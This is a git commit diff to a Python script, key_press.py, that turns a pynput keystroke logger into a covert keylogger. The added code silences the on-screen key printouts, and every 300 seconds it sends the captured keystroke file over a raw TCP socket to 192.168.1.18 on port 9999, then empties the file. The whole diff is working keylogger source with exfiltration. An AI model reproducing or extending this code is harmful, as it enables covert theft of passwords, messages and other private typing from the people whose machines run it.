601a61dde99aab780e398c0bd0d36af0dc8870f4
Yodasfather <44952970+Yodasfather@users.noreply.github.com>
2021-02-28 10:48:41 +0100

    Update key_press.py

--- key_press.py
+++ key_press.py
@@ -1,5 +1,8 @@
 from pynput import keyboard
+from threading import Timer
+import socket
 
+ip = "192.168.1.18"
 list = []
 
 def get_key_name(key):
@@ -15,10 +18,39 @@ def on_press(key):
     for ele in list:
           f.write(ele)
     f.close()
-    print("Key {} pressed".format(key_name))
-    print("Key type: {}".format(key.__class__.__name__))
+#    print("Key {} pressed".format(key_name))
+#    print("Key type: {}".format(key.__class__.__name__))
 
-with keyboard.Listener(
-    on_press = on_press) as listener:
-    listener.join()
 
+def timer():
+	time = Timer(300, timer)  # après chaque 10s on lance la function timer
+	time.start()
+	try:
+		file = open("keyPressed.txt", "r")
+		sendFile()
+		file.close
+		file = open("keyPressed.txt", "w")
+		file.close
+	except:
+		nothing = ""
+
+def sendFile():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((ip, 9999))
+	with open('keyPressed.txt', 'rb') as file:
+		s.send("Get checker file".encode('ascii'))
+		l = file.read(1024)
+		while (l):
+			s.send(l)
+			l = file.read(1024)
+
+	remove_file()
+
+	print("Le fichier a été correctement copié et effacer ")
+
+
+if __name__ == "__main__":
+    with keyboard.Listener(
+        on_press = on_press) as listener:
+        timer() 
+        listener.join()
